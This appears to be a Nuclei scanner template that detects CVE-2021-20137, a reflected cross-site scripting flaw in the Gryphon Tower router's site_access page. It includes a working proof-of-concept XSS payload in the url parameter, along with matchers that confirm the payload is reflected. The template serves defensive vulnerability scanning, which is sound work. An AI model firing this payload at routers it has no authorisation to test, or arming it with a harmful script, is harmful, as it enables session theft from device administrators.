id: CVE-2021-20137

info:
  name: Gryphon Tower - Cross-Site Scripting
  author: edoardottt
  severity: medium
  description: Gryphon Tower router web interface contains a reflected cross-site scripting vulnerability in the url parameter of the /cgi-bin/luci/site_access/ page. An attacker can exploit this issue by tricking a user into following a specially crafted link, granting the attacker JavaScript execution in the victim's browser.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to inject malicious scripts into web pages viewed by users, leading to potential data theft, session hijacking, or defacement of the affected website.
  remediation: |
    Upgrade to the latest version to mitigate this vulnerability.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-20137
    - https://www.tenable.com/security/research/tra-2021-51
    - https://nvd.nist.gov/vuln/detail/CVE-2021-20137
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-20137
    cwe-id: CWE-79
    epss-score: 0.24456
    epss-percentile: 0.96515
    cpe: cpe:2.3:o:gryphonconnect:gryphon_tower_firmware:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: gryphonconnect
    product: gryphon_tower_firmware
  tags: cve2021,cve,xss,tenable,gryphon,gryphonconnect

http:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/luci/site_access/?url=%22%20onfocus=alert(document.domain)%20autofocus=1"

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "text/html"

      - type: word
        part: body
        words:
          - 'onfocus=alert(document.domain) autofocus=1>'
          - 'Send Access Request URL'
        condition: and

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100f59adf2060e9bd5cd6778f48d141f1bd0ac128d97a8dde7e931d4f3135d0e887022100f9c874e8c0cc7c2e23d9bd5f892e66fb4e28e818ba92abb6ccc29c10c845173e:922c64590222798bb761d5b6d8e72950